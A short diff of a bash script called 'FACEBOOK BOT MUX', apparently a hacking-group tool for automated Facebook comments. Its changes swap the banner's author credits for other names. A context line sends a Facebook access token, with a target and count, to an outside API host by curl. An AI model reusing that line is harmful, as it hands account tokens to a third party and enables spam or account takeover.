@@ -18,8 +18,8 @@ header(){
 printf "${GREEN}
          ######################################
          ##          FACEBOOK BOT MUX.       ##${BLUE}
-         ##          By : X-Mr. R4h1M        ##${RED}
-         ##      AndroSec1337 Cyber Team.    ##${NOCOLOR}
+         ##          ALIF PUTRA DARMAWAN.      ##${RED}
+         ##      HACKCOD3X.    ##${NOCOLOR}
 	 ######################################${GREEN}
 "
 }
@@ -73,3 +73,4 @@ elif [ $method -eq "4" ]; then
     	curl -s "http://48.nakocoders.org/api/komencopas/api.php?tokenna=$tokenfb&jumlah=$limit&target=$target"
 done
 fi
+
